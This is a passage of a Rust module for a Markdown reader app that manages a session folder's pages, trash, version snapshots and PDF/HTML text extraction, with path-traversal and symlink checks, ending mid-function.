//! Reading and writing the session folder: pages, session state and versions.

use crate::error::{AppError, Result};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use serde_json::{json, Map, Value};
use std::collections::HashMap;
use std::fs;
use std::path::{Component, Path, PathBuf};
use walkdir::WalkDir;

const READER_DIR: &str = ".reader";

#[derive(Serialize, Deserialize, Clone)]
pub struct RawPage {
    pub path: String,
    pub raw: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub modified: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub created: Option<String>,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct VersionInfo {
    pub n: u32,
    pub at: String,
}

/// What `resolve_session` found: the folder and file to open, and every relative path
/// that moved (`[from, to]`). `folderId` / `fileId` are Unix `dev:ino`; `bookmark` is a
/// Mac NSURL bookmark for the folder, when one could be made or refreshed.
#[derive(Serialize, Deserialize, Clone, Debug)]
#[serde(rename_all = "camelCase")]
pub struct ResolvedSession {
    pub folder: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub file: Option<String>,
    pub remaps: Vec<(String, String)>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub folder_id: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub file_id: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub bookmark: Option<String>,
}

fn iso(t: std::io::Result<std::time::SystemTime>) -> Option<String> {
    t.ok().map(|t| DateTime::<Utc>::from(t).to_rfc3339())
}

/// Rejects paths that escape the folder: `..`, absolute paths, and symlinks (the page or a folder on
/// the way to it) that resolve outside it, which a cloned repo or an unzipped folder can carry.
fn safe_join(folder: &str, rel: &str) -> Result<PathBuf> {
    let rel_path = Path::new(rel);
    let outside = || AppError::Message(format!("Refusing path outside the folder: {rel}"));
    if rel_path.is_absolute() || rel_path.components().any(|c| matches!(c, Component::ParentDir)) {
        return Err(outside());
    }
    let full = Path::new(folder).join(rel_path);
    // What exists of the path is resolved; a page not written yet resolves by its nearest folder.
    // A folder that does not exist yet holds no links.
    if let Ok(root) = fs::canonicalize(folder) {
        if let Some(existing) = full.ancestors().find(|p| p.exists()) {
            if !fs::canonicalize(existing)?.starts_with(&root) {
                return Err(outside());
            }
        }
    }
    Ok(full)
}

fn rel_string(folder: &Path, full: &Path) -> Option<String> {
    full.strip_prefix(folder).ok().map(|p| p.to_string_lossy().replace('\\', "/"))
}

pub fn list_pages(folder: &str) -> Result<Vec<RawPage>> {
    let root = Path::new(folder);
    if !root.is_dir() {
        return Err(AppError::Message(format!("Not a folder: {folder}")));
    }
    let mut out = Vec::new();
    // Hidden directories and node_modules are skipped, but never the root itself, whatever it is called.
    let walker = WalkDir::new(root).follow_links(false).into_iter().filter_entry(|e| {
        let name = e.file_name().to_string_lossy();
        e.depth() == 0 || !(name.starts_with('.') || name == "node_modules")
    });
    for entry in walker.filter_map(|e| e.ok()) {
        if !entry.file_type().is_file() {
            continue;
        }
        let path = entry.path();
        if !is_openable_page(path) {
            continue;
        }
        let Some(rel) = rel_string(root, path) else { continue };
        let raw = if is_markdown(path) {
            fs::read_to_string(path).map_err(AppError::from)
        } else if is_pdf(path) {
            extract_pdf_text(path)
        } else if is_html(path) {
            extract_html_text(path)
        } else {
            continue;
        };
        // A file that can't be read (a scan with no text, a PDF the parser rejects, a note that
        // isn't UTF-8, a PDF or HTML file past the size cap) is left out, rather than keeping the
        // whole folder from opening. `read_page` still gives the reason; the reader, which opens a
        // single file from this listing, says "Not a Markdown page" for it.
        let Ok(raw) = raw else { continue };
        let meta = entry.metadata().ok();
        out.push(RawPage {
            path: rel,
            raw,
            modified: meta.as_ref().and_then(|m| iso(m.modified())),
            created: meta.as_ref().and_then(|m| iso(m.created())),
        });
    }
    out.sort_by(|a, b| a.path.cmp(&b.path));
    Ok(out)
}

pub fn read_page(folder: &str, rel: &str) -> Result<RawPage> {
    let full = safe_join(folder, rel)?;
    let raw = if is_markdown(&full) {
        fs::read_to_string(&full)?
    } else if is_pdf(&full) {
        extract_pdf_text(&full)?
    } else if is_html(&full) {
        extract_html_text(&full)?
    } else {
        return Err(AppError::Message(format!("Unsupported file type: {}", rel)));
    };
    let meta = fs::metadata(&full).ok();
    Ok(RawPage {
        path: rel.to_string(),
        raw,
        modified: meta.as_ref().and_then(|m| iso(m.modified())),
        created: meta.as_ref().and_then(|m| iso(m.created())),
    })
}

/// Atomic write: temp file in the same directory, then rename over the target.
pub fn write_atomic(full: &Path, content: &str) -> Result<()> {
    if let Some(parent) = full.parent() {
        fs::create_dir_all(parent)?;
    }
    let tmp = full.with_extension(format!(
        "{}.tmp-{}",
        full.extension().map(|e| e.to_string_lossy().to_string()).unwrap_or_default(),
        std::process::id()
    ));
    fs::write(&tmp, content)?;
    fs::rename(&tmp, full)?;
    Ok(())
}

pub fn write_page(folder: &str, rel: &str, content: &str) -> Result<()> {
    let full = safe_join(folder, rel)?;
    // PDF and HTML files are read-only; prevent writing to them
    if is_pdf(&full) || is_html(&full) {
        return Err(AppError::Message(format!(
            "Cannot write to read-only file type: {}. Create a companion .md file instead.",
            rel
        )));
    }
    if !is_markdown(&full) {
        return Err(not_markdown(rel));
    }
    write_atomic(&full, content)
}

/// The page commands write pages, and pages are Markdown. Their folder comes from the webview, so
/// this keeps them from writing anything else (a `.plist`, a shell profile) wherever it names.
fn not_markdown(rel: &str) -> AppError {
    AppError::Message(format!("Only Markdown pages can be written: {rel}"))
}

/// Writes a page that must be new. If anything is already at `rel` (in any case, on a volume that
/// ignores case) it is left untouched and this returns `false`, so the caller can try another name.
/// `write_page` would replace it, and a note the app hasn't listed yet has no snapshot to restore.
pub fn write_new_page(folder: &str, rel: &str, content: &str) -> Result<bool> {
    use std::io::Write;
    let full = safe_join(folder, rel)?;
    if !is_markdown(&full) {
        return Err(not_markdown(rel));
    }
    if let Some(parent) = full.parent() {
        fs::create_dir_all(parent)?;
    }
    // `create_new` fails if the path exists, in the same step that creates it.
    let mut file = match fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(&full)
    {
        Ok(f) => f,
        Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => return Ok(false),
        Err(e) => return Err(e.into()),
    };
    if let Err(e) = file.write_all(content.as_bytes()) {
        // The file is ours from `create_new`, so a half-written one can go.
        drop(file);
        let _ = fs::remove_file(&full);
        return Err(e.into());
    }
    Ok(true)
}

/// Takes a page out of the folder: its file and its version snapshots are moved into
/// `.reader/trash/`, rather than removed, so a delete can be undone (`restore_page`, or by hand in
/// Finder). A name already sitting in the trash gets `-2`, `-3`, and so on. Returns the name used.
pub fn delete_page(folder: &str, rel: &str) -> Result<String> {
    let full = safe_join(folder, rel)?;
    if !is_openable_page(&full) {
        return Err(AppError::Message(format!("Not a page: {rel}")));
    }
    if !full.is_file() {
        return Err(AppError::Message(format!("No such page: {rel}")));
    }
    let trash = reader_dir(folder)?.join("trash");
    fs::create_dir_all(&trash)?;
    let stem = full.file_stem().map(|s| s.to_string_lossy().to_string()).unwrap_or_else(|| "page".into());
    let ext = full.extension().map(|e| e.to_string_lossy().to_string()).unwrap_or_else(|| "md".into());
    // The page and its snapshots are parked under one name, so they can be told apart and put back together.
    let mut name = stem.clone();
    let mut i = 2;
    while trash.join(format!("{name}.{ext}")).exists() || trash.join(format!("{name}-versions")).exists() {
        name = format!("{stem}-{i}");
        i += 1;
    }
    fs::rename(&full, trash.join(format!("{name}.{ext}")))?;
    let versions = versions_dir(folder, rel)?;
    if versions.is_dir() {
        // The page is already out of the way; snapshots left behind are stale, not a failure.
        let _ = fs::rename(&versions, trash.join(format!("{name}-versions")));
    }
    Ok(name)
}

/// Undoes `delete_page`: moves the page parked as `trashed` back to `rel`, with its snapshots. If
/// anything has since appeared at `rel` it refuses, and the page stays in the trash.
pub fn restore_page(folder: &str, rel: &str, trashed: &str) -> Result<()> {
    let full = safe_join(folder, rel)?;
    // Only a page goes back, as only a page is deleted: otherwise a Markdown file parked in the
    // trash could be put back as `.zshenv`, which has no extension to check.
    if !is_openable_page(&full) {
        return Err(AppError::Message(format!("Not a page: {rel}")));
    }
    let trash = reader_dir(folder)?.join("trash");
    let ext = full.extension().map(|e| e.to_string_lossy().to_string()).unwrap_or_else(|| "md".into());
    let parked = safe_join(&trash.to_string_lossy(), &format!("{trashed}.{ext}"))?;
    if !parked.is_file() {
        return Err(AppError::Message("The deleted page is no longer in .reader/trash.".into()));
    }
    if let Some(parent) = full.parent() {
        fs::create_dir_all(parent)?;
    }
    // `rename` would replace whatever is there. `hard_link` fails if the path is taken, atomically, so
    // a file that has appeared is never overwritten.
    // ponytail: a volume without hard links (exFAT) can't undo, and says so; add a fallback if that comes up.
    fs::hard_link(&parked, &full).map_err(|e| match e.kind() {
        std::io::ErrorKind::AlreadyExists => AppError::Message(format!("{rel} already exists, so the deleted page stays in .reader/trash.")),
        _ => AppError::Message(format!("Couldn't put the page back ({e}). It's still in .reader/trash.")),
    })?;
    fs::remove_file(&parked)?;
    let versions = versions_dir(folder, rel)?;
    let parked_versions = trash.join(format!("{trashed}-versions"));
    if parked_versions.is_dir() && !versions.exists() {
        // The page is already back; snapshots that can't follow stay in the trash, not a failure.
        if let Some(parent) = versions.parent() {
            let _ = fs::create_dir_all(parent);
        }
        let _ = fs::rename(&parked_versions, &versions);
    }
    Ok(())
}

/// `.reader/trash`, if the folder has one. A link in its place is refused rather than followed, so
/// emptying the trash can never reach outside the folder.
fn trash_dir(folder: &str) -> Result<Option<PathBuf>> {
    let trash = reader_dir(folder)?.join("trash");
    match fs::symlink_metadata(&trash) {
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(e) => Err(e.into()),
        Ok(m) if m.is_dir() => Ok(Some(trash)),
        Ok(_) => Err(AppError::Message(".reader/trash isn't a plain folder, so it's left alone.".into())),
    }
}

/// How many deleted pages wait in `.reader/trash`: its files, not the snapshot folders beside them.
pub fn trash_count(folder: &str) -> Result<u32> {
    let Some(trash) = trash_dir(folder)? else { return Ok(0) };
    let mut n = 0;
    for entry in fs::read_dir(trash)? {
        if entry?.file_type()?.is_file() {
            n += 1;
        }
    }
    Ok(n)
}

/// Removes everything inside `.reader/trash` for good, and leaves the folder itself. A link in there
/// goes as a link: `file_type` and `remove_dir_all` never follow one. Returns how many pages went.
pub fn empty_trash(folder: &str) -> Result<u32> {
    let Some(trash) = trash_dir(folder)? else { return Ok(0) };
    let mut n = 0;
    for entry in fs::read_dir(trash)? {
        let entry = entry?;
        let kind = entry.file_type()?;
        if kind.is_dir() {
            fs::remove_dir_all(entry.path())?;
        } else {
            fs::remove_file(entry.path())?;
            if kind.is_file() {
                n += 1;
            }
        }
    }
    Ok(n)
}

/// `.reader`, where the app keeps a folder's session, map, snapshots and trash. A link in its place
/// is refused rather than followed, as `trash_dir` refuses one, so none of that lands outside the folder.
fn reader_dir(folder: &str) -> Result<PathBuf> {
    let dir = Path::new(folder).join(READER_DIR);
    match fs::symlink_metadata(&dir) {
        Ok(m) if m.file_type().is_symlink() => Err(AppError::Message(
            ".reader in this folder is a link, so Nested won't read or write through it. Replace it with a plain folder.".into(),
        )),
        _ => Ok(dir),
    }
}

/// A page path flattened into one file-name segment: `notes/a.md` -> `notes__a`.
fn page_key(rel: &str) -> String {
    rel.trim_end_matches(".md").replace(['/', '\\'], "__")
}

/// `.reader/session.json` for a folder session; a session opened from one file
/// inside the folder keeps its own state in `.reader/session-<page>.json`.
fn session_path(folder: &str, file: Option<&str>) -> Result<PathBuf> {
    let dir = reader_dir(folder)?;
    Ok(match file {
        None => dir.join("session.json"),
        Some(rel) => {
            safe_join(folder, rel)?;
            dir.join(format!("session-{}.json", page_key(rel)))
        }
    })
}

pub fn load_session(folder: &str, file: Option<&str>) -> Result<Option<serde_json::Value>> {
    let path = session_path(folder, file)?;
    if !path.exists() {
        return Ok(None);
    }
    let text = fs::read_to_string(path)?;
    Ok(Some(serde_json::from_str(&text)?))
}

pub fn save_session(folder: &str, session: &Value, file: Option<&str>) -> Result<()> {
    let mut session = session.clone();
    if let Some(obj) = session.as_object_mut() {
        obj.insert("ids".into(), json!(collect_ids(folder)));
    }
    let path = session_path(folder, file)?;
    write_atomic(&path, &serde_json::to_string_pretty(&session)?)
}

/// The session map: a page-by-page index of the folder that goes into every prompt, so the model
/// knows what else is in the session even when the pages themselves did not fit the budget.
/// `map.json` holds the one-line summaries and the fingerprint of the text each was written for;
/// `map.md` is the same thing rendered, kept beside it so it can be read without the app.
pub fn load_map(folder: &str) -> Result<Option<Value>> {
    let path = reader_dir(folder)?.join("map.json");
    if !path.exists() {
        return Ok(None);
    }
    let text = fs::read_to_string(path)?;
    Ok(Some(serde_json::from_str(&text)?))
}

pub fn save_map(folder: &str, cache: &Value, rendered: &str) -> Result<()> {
    let dir = reader_dir(folder)?;
    write_atomic(&dir.join("map.json"), &serde_json::to_string_pretty(cache)?)?;
    write_atomic(&dir.join("map.md"), rendered)
}

fn versions_dir(folder: &str, rel: &str) -> Result<PathBuf> {
    safe_join(folder, rel)?;
    Ok(reader_dir(folder)?.join("versions").join(page_key(rel)))
}

/// Whether a dropped path is a folder, a Markdown file, or something the reader cannot open.
pub fn path_kind(path: &str) -> &'static str {
    let p = Path::new(path);
    if p.is_dir() {
        "folder"
    } else if p.is_file() && is_openable_page(p) {
        "file"
    } else {
        "other"
    }
}

fn is_markdown(path: &Path) -> bool {
    path.extension()
        .map(|e| e.eq_ignore_ascii_case("md") || e.eq_ignore_ascii_case("markdown"))
        .unwrap_or(false)
}

fn is_pdf(path: &Path) -> bool {
    path.extension()
        .map(|e| e.eq_ignore_ascii_case("pdf"))
        .unwrap_or(false)
}

fn is_html(path: &Path) -> bool {
    path.extension()
        .map(|e| e.eq_ignore_ascii_case("html") || e.eq_ignore_ascii_case("htm"))
        .unwrap_or(false)
}

fn is_openable_page(path: &Path) -> bool {
    is_markdown(path) || is_pdf(path) || is_html(path)
}

/// The largest PDF or HTML file whose text is read. Every listing reads and parses each one whole,
/// so a bigger file would hold up the folder every time it opens; it is left out of the listing
/// like an unreadable file, and `read_page` gives this reason.
const MAX_EXTRACT_BYTES: u64 = 50 * 1024 * 1024;

fn check_extract_size(path: &Path) -> Result<()> {
    let len = fs::metadata(path)?.len();
    if len > MAX_EXTRACT_BYTES {
        const MB: u64 = 1024 * 1024;
        let name = path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
        return Err(AppError::Message(format!(
            "{name} is too big to read ({} MB; Nested reads PDF and HTML files up to {} MB).",
            len.div_ceil(MB),
            MAX_EXTRACT_BYTES / MB
        )));
    }
    Ok(())
}

/// Extract text content from a PDF file using the pdf-extract crate,
/// then apply Markdown structure inference and paragraph consolidation.
fn extract_pdf_text(path: &Path) -> Result<String> {
    check_extract_size(path)?;
    let bytes = fs::read(path)?;
    
    // pdf-extract panics on some malformed files (text shown before any font is set, a missing
    // font). That is a PDF it can't read, so it takes the same fallback as one it rejects.
    let parsed = std::panic::catch_unwind(|| pdf_extract::extract_text_from_mem(&bytes)).ok().and_then(|r| r.ok());
    let raw_text = match parsed {
        Some(text) => {
            let trimmed = text.trim();
            if trimmed.is_empty() {
                // PDF exists but has no extractable text (e.g., scanned image-only PDF)
                return Err(AppError::Message(format!(
                    "PDF file '{}' contains no extractable text (possibly a scanned document)",
                    path.file_name().and_then(|n| n.to_str()).unwrap_or("document")
                )));
            }
            text
        }
        None => {
            // pdf-extract failed, try naive BT/ET fallback for simple test PDFs
            let text = extract_pdf_text_naive(&bytes);
            if text.trim().is_empty() {
                return Err(AppError::Message(format!(
                    "Failed to extract text from PDF '{}'",
                    path.file_name().and_then(|n| n.to_str()).unwrap_or("document")
                )));
            }
            text
        }
    };
    
    // Apply structure inference and paragraph consolidation
    Ok(crate::pdf_extractor::add_structure_and_reflow(&raw_text))
}

/// Naive PDF text extraction for simple hand-crafted test PDFs.
/// Scans for BT/ET operators and (text) Tj commands in uncompressed streams.
/// This is a fallback only; real PDFs should use pdf-extract.
fn extract_pdf_text_naive(bytes: &[u8]) -> String {
    let content = String::from_utf8_lossy(bytes);
    let mut text = String::new();
    let mut in_text = false;
    
    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed == "BT" {
            in_text = true;
        } else if trimmed == "ET" {
            in_text = false;
            text.push('\n');
        } else if in_text {
            // Look for text in parentheses: (text) Tj
            if let Some(start) = trimmed.find('(') {
                if let Some(end) = trimmed[start..].find(')') {
                    let extracted = &trimmed[start + 1..start + end];
                    text.push_str(extracted);
                    text.push(' ');
                }
            }
        }
    }
    
    text
}

/// Extract text content from an HTML file.
/// Simple HTML-to-text conversion that strips tags and decodes entities.
fn extract_html_text(path: &Path) -> Result<String> {
    check_extract_size(path)?;
    let html = fs::read_to_string(path)?;
    
    // Remove script and style tags and their content
    let mut cleaned = html.clone();
    while let Some(start) = cleaned.find("<script") {
        if let Some(end) = cleaned[start..].find("</script>") {
            cleaned.replace_range(start..start + end + 9, "");
        } else {
            break;
        }
    }
    while let Some(start) = cleaned.find("<style") {
        if let Some(end) = cleaned[start..].find("</style>") {
            cleaned.replace_range(start..start + end + 8, "");
        } else {
            break;
        }
    }
    
    // Replace HTML tags with spaces
    let mut result = String::new();
    let mut in_tag = false;
    for c in cleaned.chars() {
        match c {
            '<' => in_tag = true,
            '>' => {
                in_tag = false;
                result.push(' ');
            }
            _ if !in_tag => result.push(c),
            _ => {}
        }
    }
    
    // Decode common HTML entities
    result = result
        .replace("&nbsp;", " ")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&amp;", "&")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&apos;", "'");
    
    // Normalize whitespace
    let text: String = result
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ");
    
    Ok(text)
}

pub fn list_versions(folder: &str, rel: &str) -> Result<Vec<VersionInfo>> {
    let dir = versions_dir(folder, rel)?;
    let mut out = Vec::new();
    if !dir.is_dir() {
        return Ok(out);
    }
    for entry in fs::read_dir(&dir)?.filter_map(|e| e.ok()) {
        let name = entry.file_name().to_string_lossy().to_string();
        let Some(num) = name.strip_prefix('v').and_then(|s| s.strip_suffix(".md")) else { continue };
        let Ok(n) = num.parse::<u32>() else { continue };
        let at = entry.metadata().ok().and_then(|m| iso(m.modified())).unwrap_or_default();
        out.push(VersionInfo { n, at });
    }
    out.sort_by_key(|v| v.n);
    Ok(out)
}

pub fn read_version(folder: &str, rel: &str, n: u32) -> Result<String> {
    let path = versions_dir(folder, rel)?.join(format!("v{n}.md"));
    Ok(fs::read_to_string(path)?)
}

pub fn snapshot_version(folder: &str, rel: &str) -> Result<u32> {
    let full = safe_join(folder, rel)?;
    // Versions are of Markdown pages; a snapshot of any other file would be a way to read it.
    if !is_markdown(&full) {
        return Err(AppError::Message(format!("Not a page: {rel}")));
    }
    let current = fs::read_to_string(full)?;
    let n = list_versions(folder, rel)?.last().map(|v| v.n).unwrap_or(0) + 1;
    let path = versions_dir(folder, rel)?.join(format!("v{n}.md"));
    write_atomic(&path, &current)?;
    Ok(n)
}

pub fn restore_version(folder: &str, rel: &str, n: u32) -> Result<()> {
    let content = read_version(folder, rel, n)?;
    write_page(folder, rel, &content)?;
    for v in list_versions(folder, rel)? {
        if v.n >= n {
            let _ = fs::remove_file(versions_dir(folder, rel)?.join(format!("v{}.md", v.n)));
        }
    }
    Ok(())
}

pub fn delete_version(folder: &str, rel: &str, n: u32) -> Result<()> {
    let path = versions_dir(folder, rel)?.join(format!("v{n}.md"));
    if path.exists() {
        fs::remove_file(path)?;
    }
    Ok(())
}

/// Unix `dev:ino` for a path, so a Finder rename of the same file can be matched later.
/// Cross-volume copies get a new inode and are treated as a new file.
pub fn path_id(path: &Path) -> Option<String> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        let m = fs::metadata(path).ok()?;
        Some(format!("{}:{}", m.dev(), m.ino()))
    }
    #[cfg(not(unix))]
    {
        let _ = path;
        None
    }
}

/// Relative page path → `dev:ino` for every Markdown file in the folder, same walk as `list_pages`.
pub fn collect_ids(folder: &str) -> HashMap<String, String> {
    let mut out = HashMap::new();
    let root = Path::new(folder);
    if !root.is_dir() {
        return out;
    }
    for_each_markdown(root, |path, rel| {
        if let Some(id) = path_id(path) {
            out.insert(rel.to_string(), id);
        }
    });
    out
}

/// If `file` is missing, match Markdown in the folder by stored `dev:ino`. When a relative
/// path remaps, rename `.reader/session-<old>.json` and `versions/<old_key>/` if the
/// destination is free, and rewrite trail/current/unread/pending/`source` in the same pass.
///
/// On Mac, `bookmark` is tried first when the absolute folder path is gone. There is no
/// full-volume search if both the path and the bookmark fail.
/// Where a page path that is a symlink really points, as its folder and file name; `None` for a plain
/// file. A file opened through a link (`~/Desktop/plan.md -> ~/Projects/x/plan.md`) opens there: the
/// listing skips links, since a link can point anywhere, and the pages grown from it belong beside it.
fn symlink_target(path: &Path) -> Option<(String, String)> {
    if !fs::symlink_metadata(path).ok()?.file_type().is_symlink() {
        return None;
    }
    let real = fs::canonicalize(path).ok().filter(|p| p.is_file())?;
    Some((real.parent()?.to_string_lossy().into_owned(), real.file_name()?.to_string_lossy().into_owned()))
}

pub fn resolve_session(
    folder: &str,
    file: Option<&str>,
    ids: Option<&HashMap<String, String>>,
    bookmark: Option<&str>,
) -> Result<ResolvedSession> {
    let mut folder = folder.to_string();
    let mut opened = file.filter(|s| !s.is_empty()).map(str::to_string);
    if let Some((real_folder, name)) = opened.as_deref().and_then(|f| symlink_target(&Path::new(&folder).join(f))) {
        folder = real_folder;
        opened = Some(name);
    }
    let file = opened.as_deref();
    if !Path::new(&folder).is_dir() {
        if let Some(resolved) = bookmark.and_then(resolve_bookmark) {
            if Path::new(&resolved).is_dir() {
                folder = resolved;
            }
        }
    }

    let bookmark_out = folder_bookmark(&folder).or_else(|| bookmark.map(str::to_string));
    let folder_id = path_id(Path::new(&folder));

    if !Path::new(&folder).is_dir() {
        return Ok(ResolvedSession {
            folder,
            file: file.map(str::to_string),
            remaps: vec![],
            folder_id,
            file_id: None,
            bookmark: bookmark_out,
        });
    }

    let remaps = find_remaps(&folder, file, ids);
    let new_file = file.map(|f| apply_one(f, &remaps));
    if !remaps.is_empty() {
        relocate_reader_dirs(&folder, &remaps)?;
        rewrite_session_keys(&folder, file, &new_file, &remaps)?;
        rewrite_source_keys(&folder, &remaps);
    }

    let file_id = new_file.as_ref().and_then(|rel| path_id(&Path::new(&folder).join(rel)));
    Ok(ResolvedSession {
        folder,
        file: new_file,
        remaps,
        folder_id,
        file_id,
        bookmark: bookmark_out,
    })
}

fn for_each_markdown(root: &Path, mut f: impl FnMut(&Path, &str)) {
    let walker = WalkDir::new(root).follow_links(false).into_iter().filter_entry(|e| {
        let name = e.file_name().to_string_lossy();
        e.depth() == 0 || !(name.starts_with('.') || name == "node_modules")
    });
    for entry in walker.filter_map(|e| e.ok()) {
        if !entry.file_type().is_file() {
            continue;
        }
        let path = entry.path();
        if !is_markdown(path) {
            continue;
        }
        let Some(rel) = rel_string(root, path) else { continue };
        f(path, &rel);
    }
}

fn index_by_id(folder: &str) -> HashMap<String, String> {
    let mut out = HashMap::new();
    for_each_markdown(Path::new(folder), |path, rel| {
        if let Some(id) = path_id(path) {
            out.entry(id).or_insert_with(|| rel.to_string());
        }
    });
    out
}

fn merge_ids(folder: &str, file: Option<&str>, passed: Option<&HashMap<String, String>>) -> HashMap<String, String> {
    let mut ids = HashMap::new();
    if let Ok(Some(stored)) = load_session(folder, file) {
        if let Some(obj) = stored.get("ids").and_then(|v| v.as_object()) {
            for (k, v) in obj {
                if let Some(id) = v.as_str() {
                    ids.insert(k.clone(), id.to_string());
                }
            }
        }
    }
    if let Some(passed) = passed {
        for (k, v) in passed {
            ids.insert(k.clone(), v.clone());
        }
    }
    ids
}

fn find_remaps(folder: &str, file: Option<&str>, passed: Option<&HashMap<String, String>>) -> Vec<(String, String)> {
    let ids = merge_ids(folder, file, passed);
    if ids.is_empty() {
        return vec![];
    }
    let by_id = index_by_id(folder);
    let mut remaps = Vec::new();
    let mut taken = std::collections::HashSet::new();
    for (old, id) in &ids {
        let Ok(full) = safe_join(folder, old) else { continue };
        if path_id(&full).as_deref() == Some(id.as_str()) {
            continue;
        }
        let Some(new_rel) = by_id.get(id) else { continue };
        if new_rel == old || taken.contains(new_rel) {
            continue;
        }
        taken.insert(new_rel.clone());
        remaps.push((old.clone(), new_rel.clone()));
    }
    remaps.sort_by(|a, b| a.0.cmp(&b.0));
    remaps
}

fn apply_one(path: &str, remaps: &[(String, String)]) -> String {
    remaps.iter().find(|(from, _)| from == path).map(|(_, to)| to.clone()).unwrap_or_else(|| path.to_string())
}

fn remap_table(remaps: &[(String, String)]) -> HashMap<String, String> {
    remaps.iter().cloned().collect()
}

/// Rename `.reader/session-<page>.json` and `versions/<page_key>/` for each remap whose destination is free.
fn relocate_reader_dirs(folder: &str, remaps: &[(String, String)]) -> Result<()> {
    for (from, to) in remaps {
        let from_session = session_path(folder, Some(from))?;
        let to_session = session_path(folder, Some(to))?;
        relocate_if_free(&from_session, &to_session);
        let from_versions = versions_dir(folder, from)?;
        let to_versions = versions_dir(folder, to)?;
        relocate_if_free(&from_versions, &to_versions);
    }
    Ok(())
}

fn relocate_if_free(from: &Path, to: &Path) {
    if from == to || !from.exists() || to.exists() {
        return;
    }
    if let Some(parent) = to.parent() {
        let _ = fs::create_dir_all(parent);
    }
    let _ = fs::rename(from, to);
}

fn rewrite_session_keys(folder: &str, old_file: Option<&str>, new_file: &Option<String>, remaps: &[(String, String)]) -> Result<()> {
    let table = remap_table(remaps);
    let src = session_path(folder, old_file)?;
    let dest = session_path(folder, new_file.as_deref())?;
    let mut session = if src.exists() {
        serde_json::from_str(&fs::read_to_string(&src)?)?
    } else if dest.exists() && dest != src {
        serde_json::from_str(&fs::read_to_string(&dest)?)?
    } else {
        return Ok(());
    };
    remap_session_value(&mut session, folder, &table);
    if let Some(obj) = session.as_object_mut() {
        obj.insert("ids".into(), json!(collect_ids(folder)));
    }

    if src != dest && dest.exists() && src.exists() {
        // Another session already lives at the new name; keep the rewritten state on the old file.
        write_atomic(&src, &serde_json::to_string_pretty(&session)?)?;
        return Ok(());
    }
    if src != dest && src.exists() && !dest.exists() {
        relocate_if_free(&src, &dest);
    }
    write_atomic(&dest, &serde_json::to_string_pretty(&session)?)?;
    if src != dest && src.exists() {
        let _ = fs::remove_file(&src);
    }
    Ok(())
}

fn remap_session_value(session: &mut Value, folder: &str, remaps: &HashMap<String, String>) {
    let Some(obj) = session.as_object_mut() else { return };
    for key in ["current", "split"] {
        remap_string_field(obj, key, remaps);
    }
    for key in ["trail", "unread", "loading"] {
        remap_string_list(obj, key, remaps);
    }
    for key in ["read", "pending", "asks", "ids"] {
        remap_object_keys(obj, key, remaps);
    }
    if let Some(Value::Array(roots)) = obj.get_mut("roots") {
        for root in roots {
            let Some(root_obj) = root.as_object_mut() else { continue };
            let same_folder = root_obj.get("folder").and_then(|v| v.as_str()) == Some(folder);
            if same_folder {
                remap_string_field(root_obj, "file", remaps);
            }
        }
    }
}

fn remap_string_field(obj: &mut Map<String, Value>, key: &str, remaps: &HashMap<String, String>) {
    let Some(Value::String(s)) = obj.get(key) else { return };
    if let Some(to) = remaps.get(s) {
        obj.insert(key.to_string(), json!(to));
    }
}

fn remap_string_list(obj: &mut Map<String, Value>, key: &str, remaps: &HashMap<String, String>) {
    let Some(Value::Array(arr)) = obj.get_mut(key) else { return };
    for item in arr {
        let Some(s) = item.as_str() else { continue };
        if let Some(to) = remaps.get(s) {
            *item = json!(to);
        }
    }
}

fn remap_object_keys(obj: &mut Map<String, Value>, key: &str, remaps: &HashMap<String, String>) {
    let Some(Value::Object(map)) = obj.get_mut(key) else { return };
    let old = std::mem::take(map);
    for (k, v) in old {
        map.insert(remaps.get(&k).cloned().unwrap_or(k), v);
    }
}

/// Pages that still name a remapped path as `source` follow it, so a file session keeps its grown pages.
fn rewrite_source_keys(folder: &str, remaps: &[(String, String)]) {
    if remaps.is_empty() {
        return;
    }
    let table = remap_table(remaps);
    let root = Path::new(folder);
    let mut files = Vec::new();
    for_each_markdown(root, |path, _| files.push(path.to_path_buf()));
    for path in files {
        let Ok(raw) = fs::read_to_string(&path) else { continue };
        let Some(next) = remap_source_in_raw(&raw, &table) else { continue };
        let _ = write_atomic(&path, &next);
    }
}

fn remap_source_in_raw(raw: &str, remaps: &HashMap<String, String>) -> Option<String> {
    if !raw.starts_with("---") {
        return None;
    }
    let mut out = String::new();
    let mut in_fm = false;
    let mut seen_open = false;
    let mut changed = false;
    for line in raw.split_inclusive('\n') {
        let trimmed = line.trim_end_matches(['\r', '\n']);
        if !seen_open {
            seen_open = trimmed == "---";
            in_fm = seen_open;
            out.push_str(line);
            continue;
        }
        if in_fm && trimmed == "---" {
            in_fm = false;
            out.push_str(line);
            continue;
        }
        if in_fm {
            if let Some(value) = trimmed.strip_prefix("source:") {
                let unquoted = unquote_yaml(value.trim());
                if let Some(to) = remaps.get(&unquoted) {
                    out.push_str("source: ");
                    out.push_str(&yaml_scalar(to));
                    if line.ends_with('\n') {
                        out.push('\n');
                    }
                    changed = true;
                    continue;
                }
            }
        }
        out.push_str(line);
    }
    changed.then_some(out)
}

fn unquote_yaml(s: &str) -> String {
    if s.len() >= 2 && s.starts_with('"') && s.ends_with('"') {
        return serde_json::from_str(s).unwrap_or_else(|_| s[1..s.len() - 1].to_string());
    }
    if s.len() >= 2 && s.starts_with('\'') && s.ends_with('\'') {
        return s[1..s.len() - 1].replace("''", "'");
    }
    s.to_string()
}

fn yaml_scalar(s: &str) -> String {
    if s.is_empty() || s.trim() != s || s.contains([':', '#', '"', '\'', '\n']) {
